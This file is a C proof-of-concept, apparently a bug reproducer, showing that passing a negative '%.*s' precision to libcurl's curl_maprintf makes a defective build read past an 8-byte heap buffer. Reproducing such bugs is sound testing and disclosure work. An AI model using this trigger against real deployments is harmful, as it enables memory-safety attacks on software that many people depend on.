/* PoC: in-contract use of the public mprintf API.
 *
 * curl_maprintf() accepts a printf-style format and arguments. The "%.*s"
 * conversion takes the field precision from an int argument. The C standard
 * defines a negative precision as equivalent to no precision at all, so
 * passing a negative value here is in-contract and must print the whole
 * string.
 *
 * On a correct libcurl this prints "abcdefg" and returns a heap string.
 * On the defective tree the negative precision is routed into the fast,
 * non-NUL-scanning string emitter with a length of (size_t)-8, causing a
 * heap-buffer-overflow read of the 8-byte source string.
 */
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main(void)
{
  /* heap-allocated, NUL-terminated 8-byte object: "abcdefg\0" */
  char *s = (char *)malloc(8);
  char *out;
  if(!s)
    return 2;
  memcpy(s, "abcdefg", 8);

  /* negative precision via the '*' argument == "precision omitted" */
  out = curl_maprintf("%.*s", -8, s);

  if(out) {
    /* keep the result observable so nothing is optimized away */
    fputs(out, stdout);
    fputc('\n', stdout);
    curl_free(out);
  }
  free(s);
  return 0;
}
